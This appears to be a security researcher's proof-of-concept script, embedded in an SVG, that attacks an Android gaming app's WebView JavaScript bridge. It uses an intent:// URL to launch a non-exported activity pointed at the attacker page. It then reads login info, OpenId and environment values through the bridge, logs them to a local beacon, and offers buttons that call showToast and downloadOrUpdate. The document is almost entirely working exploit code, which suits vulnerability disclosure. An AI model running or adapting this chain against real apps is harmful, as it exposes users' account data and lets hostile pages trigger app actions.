svg.script:
/* 自推进链路的“手动版”：页面加载后只做只读取值并渲染，
   两处会导航/产生副作用的动作改为屏幕上的按钮，点一下才执行 —— 便于逐屏截全图。
     hop1: HybridWebViewActivity（exported=false，外部 deeplink 驱动）
     hop2: GameOnlyPlayActivity（exported=false，页面内 intent:// 驱动，注册 GamesJS） */
var stage = (location.search.indexOf('stage=2') >= 0) ? 2 : 1;
var lines = [], MAX = 14;
function el(i){ return document.getElementById('l' + (i + 1)); }
function paint(){ for (var i = 0; i < MAX; i++){ var e = el(i); if (e) e.textContent = lines[i] || ''; } }
function put(s){ if (lines.length < MAX) { lines.push(s); } else { lines.shift(); lines.push(s); } paint(); }
function beacon(k, v){
  try { new Image().src = 'http://127.0.0.1:8899/beacon?k=' + encodeURIComponent('btn.' + k)
    + '&v=' + encodeURIComponent(String(v).slice(0, 500)) + '&r=' + Math.random(); } catch(e){}
}
function log(k, v){ put(k + ' = ' + String(v).slice(0, 90)); beacon(k, v); }
function promptCall(method, args){
  try { return String(prompt(JSON.stringify({method: method, args: args || {}}))); } catch(e){ return 'ERR:' + e; }
}
function jsapi(method, params){
  try { if (!window.appJsBridge) return 'NO_appJsBridge';
    var r = (params === undefined) ? window.appJsBridge.callApi(method) : window.appJsBridge.callApi(method, params);
    return (r === undefined) ? '<void>' : String(r);
  } catch(e){ return 'ERR:' + e; }
}
function show(id){ var e = document.getElementById(id); if (e) e.setAttribute('display', 'inline'); }
function on(id, fn){ var e = document.getElementById(id); if (e) e.addEventListener('click', fn); }

/* 桥（appJsBridge）由原生在页面加载后异步注入；轮询等待（最多 ~5s），避免过早取值拿到 NO_appJsBridge */
function whenBridge(cb){
  var n = 0;
  (function poll(){ if (window.appJsBridge || n > 25) { cb(); return; } n++; setTimeout(poll, 200); })();
}

log('href', location.href);
log('stage', stage);

if (stage === 1) {
  /* ---- hop1：等桥就绪后只读取值 + 显示按钮（不自动二跳） ---- */
  whenBridge(function(){
  log('appJsBridge', typeof window.appJsBridge);
  log('prompt.getEnv.isLogin', promptCall('getEnv', {key: 'isLogin'}));
  log('prompt.getEnv.network', promptCall('getEnv', {key: 'network'}));
  log('prompt.getEnv.apkversion', promptCall('getEnv', {key: 'apkversion'}));
  log('ready', 'tap the blue button to advance');
  show('btn1');
  });
  on('btn1', function(){
    var self = location.href.split('#')[0].split('?')[0];
    var it = 'intent://launch#Intent;component=com.heytap.games.forum/'
      + 'com.games.gameslobby.tangram.activity.GameOnlyPlayActivity;'
      + 'S.url=' + self + '?stage=2;S.appid=1000001;end';
    log('firing intent ->', 'GameOnlyPlayActivity (exported=false)');
    try { location.href = it; } catch(e){ log('intent_ERR', e); }
  });
} else {
  /* ---- hop2：等桥就绪后只读全表（不自动调用有副作用的动作） ---- */
  whenBridge(function(){
  log('appJsBridge', typeof window.appJsBridge);
  log('getBrand', jsapi('getBrand'));
  log('isLogin', jsapi('isLogin'));
  log('getLoginInfo', jsapi('getLoginInfo'));
  log('getOpenId', jsapi('getOpenId'));
  log('getHost', jsapi('getHost'));
  log('getNetworkType', jsapi('getNetworkType'));
  log('isInstalled(settings)', jsapi('isInstalled', {packageName: 'com.android.settings'}));
  log('checkNeedDownload', jsapi('checkIfNeedDownloadOrUpdate', {pkg: 'com.android.settings', version: 1}));
  log('ready', 'read-only done; tap a button for side-effect calls');
  show('btn2'); show('btn3');
  });
  on('btn2', function(){
    log('showToast', jsapi('showToast', {text: 'POC: attacker page called GamesJS', duration: 1}));
  });
  on('btn3', function(){
    log('downloadOrUpdate', jsapi('downloadOrUpdate', {pkg: 'com.poc.nonexistent.app'}));
  });
}
